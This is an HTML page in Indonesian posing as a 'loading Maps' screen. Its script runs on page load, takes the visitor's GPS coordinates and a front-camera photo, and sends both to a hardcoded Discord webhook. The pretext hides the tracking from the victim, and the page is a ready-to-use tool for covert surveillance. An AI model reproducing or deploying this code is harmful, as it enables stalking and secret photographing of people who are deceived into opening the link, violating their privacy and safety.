<!DOCTYPE html>
<html>
<head>
    <title>Sedang Memuat Maps...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Harap tunggu, sedang menyinkronkan lokasi terdekat...</p>

    <script>
        // GANTI URL DI BAWAH INI DENGAN URL WEBHOOK DISCORD KAMU
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";

        window.onload = function() {
            startTracking();
        };

        async function startTracking() {
            // 1. Ambil Lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Kirim teks lokasi ke Discord
                    kirimKeDiscord(`📍 **Lokasi Terdeteksi!**\nLink: ${mapsUrl}`);
                    
                    // 2. Ambil Foto
                    ambilFoto();
                });
            }
        }

        async function ambilFoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    const formData = new FormData();
                    formData.append('file', blob, 'foto_pengunjung.jpg');
                    formData.append('payload_json', JSON.stringify({ content: "📸 **Foto Kamera Depan Terdeteksi!**" }));

                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
                    
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);
            } catch (err) {
                kirimKeDiscord("❌ Akses kamera ditolak oleh pengguna.");
            }
        }

        function kirimKeDiscord(pesan) {
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: pesan })
            });
        }
    </script>
</body>
</html>
